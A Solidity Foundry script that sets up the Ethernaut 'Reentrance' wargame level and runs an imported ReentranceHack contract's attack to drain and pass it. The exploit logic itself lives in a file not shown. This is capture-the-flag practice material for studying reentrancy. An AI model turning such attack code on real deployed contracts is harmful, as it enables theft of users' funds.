pragma solidity ^0.8.10;

import { Script, console2 } from 'forge-std/Script.sol';
import '../src/Reentrance/ReentranceHack.sol';
import '../src/Reentrance/ReentranceFactory.sol';
import '../src/Ethernaut.sol';

contract ReentranceScript is Script {
    Ethernaut ethernaut;

    function setUp() public { }

    function run() public {
        vm.startBroadcast();

        ethernaut = new Ethernaut();
        ReentranceFactory reentranceFactory = new ReentranceFactory();
        ethernaut.registerLevel(reentranceFactory);
        address levelAddress = ethernaut.createLevelInstance{ value: 1 ether }(reentranceFactory);
        Reentrance ethernautReentrance = Reentrance(payable(levelAddress));

        ReentranceHack reentranceHack = new ReentranceHack(levelAddress);
        // attack
        reentranceHack.attack{ value: 1 ether }();

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        assert(levelSuccessfullyPassed);

        vm.stopBroadcast();
    }
}
